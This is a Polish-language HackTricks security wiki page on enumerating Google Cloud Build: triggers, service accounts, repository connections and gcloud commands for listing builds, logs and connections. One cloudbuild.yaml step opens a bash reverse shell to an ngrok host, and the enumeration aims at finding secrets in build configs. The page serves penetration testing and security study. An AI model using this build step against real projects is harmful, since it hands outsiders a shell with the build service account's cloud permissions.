# GCP - Wyliczanie usługi Cloud Build

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>

## Podstawowe informacje

Google Cloud Build to zarządzana platforma CI/CD, która **automatyzuje procesy budowania oprogramowania** i wydawania, integrując się z **repozytoriami kodu źródłowego** i obsługując szeroki zakres języków programowania. Umożliwia programistom **automatyczne budowanie, testowanie i wdrażanie kodu**, zapewniając jednocześnie elastyczność w dostosowywaniu kroków budowania i przepływów pracy.

Każdy wyzwalacz Cloud Build jest **powiązany z repozytorium Cloud lub bezpośrednio połączony z zewnętrznym repozytorium** (Github, Bitbucket i Gitlab).

{% hint style="success" %}
Nie widziałem żadnego sposobu na kradzież tokena Github/Bitbucket stąd ani z Cloud Repositories, ponieważ po pobraniu repozytorium jest ono dostępne za pomocą adresu URL [https://source.cloud.google.com/](https://source.cloud.google.com/), a Github nie jest dostępny dla klienta.
{% endhint %}

### Zdarzenia

Cloud Build może zostać uruchomiony w przypadku:

* **Wprowadzenia zmian do gałęzi**: Należy określić gałąź
* **Dodania nowej etykiety**: Należy określić etykietę
* **Pull requestu**: Należy określić gałąź, która otrzymuje PR
* **Ręcznego wywołania**
* **Wiadomości Pub/Sub**: Należy określić temat
* **Zdarzenia webhook**: Będzie udostępniony adres URL HTTPS, a żądanie musi być uwierzytelnione za pomocą sekretu

### Wykonanie

Dostępne są 3 opcje:

* Plik yaml/json **określający polecenia** do wykonania. Zazwyczaj: `/cloudbuild.yaml`
* Tylko jedno, które można określić "wewnętrznie" w konsoli internetowej i w wierszu poleceń
* Najczęstsza opcja
* Dotyczy dostępu bez uwierzytelnienia
* **Dockerfile** do budowy
* **Buildpack** do budowy

### Uprawnienia SA

**Konto usługi ma zakres `cloud-platform`**, dzięki czemu może **korzystać ze wszystkich uprawnień**. Jeśli **nie jest określone żadne konto usługi** (np. podczas składania wniosku), zostanie użyte **domyślne konto usługi** `<proj-number>@cloudbuild.gserviceaccount.com`.

Domyślnie nie są udzielane żadne uprawnienia, ale jest dość łatwo je nadać:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Zatwierdzenia

Możliwe jest skonfigurowanie Cloud Build tak, aby **wymagał zatwierdzeń dla wykonania budowy** (domyślnie wyłączone).

### Połączenia i repozytoria

Połączenia można tworzyć za pomocą:

* **GitHuba**: Wyświetli monit OAuth, proszący o uprawnienia do **uzyskania tokenu Github**, który zostanie przechowywany w **Secret Managerze**.
* **GitHub Enterprise**: Poprosi o zainstalowanie **GithubApp**. Wygenerowany zostanie i przechowywany w tym projekcie token uwierzytelniający z hosta GitHub Enterprise jako sekret **Secret Manager**.
* **GitLab / Enterprise**: Należy podać token dostępu do interfejsu API i token dostępu do odczytu interfejsu API, które zostaną przechowywane w **Secret Managerze**.

Po wygenerowaniu połączenia można go użyć do **powiązania repozytoriów, do których konto Github ma dostęp**.

Ta opcja jest dostępna za pomocą przycisku:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Należy zauważyć, że repozytoria połączone za pomocą tej metody są **dostępne tylko w wyzwalaczach korzystających z 2. generacji**.
{% endhint %}

### Połącz repozytorium

To nie jest to samo co **`połączenie`**. Pozwala to na **różne** sposoby **uzyskania dostępu do repozytorium Github lub Bitbucket**, ale **nie generuje obiektu połączenia, ale generuje obiekt repozytorium (1. generacji).**

Ta opcja jest dostępna za pomocą przycisku:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Przechowywanie

Czasami Cloud Build **generuje nowe miejsce przechowywania plików dla wyzwalacza**. Dzieje się tak na przykład w przykładzie, który oferuje GCP z:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Uzyskaj dostęp do powłoki
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### Wyliczanie

Możesz znaleźć **wrażliwe informacje w konfiguracjach i dziennikach budowy**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Eskalacja uprawnień

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Nieuwierzytelniony dostęp

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Po eksploatacji

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
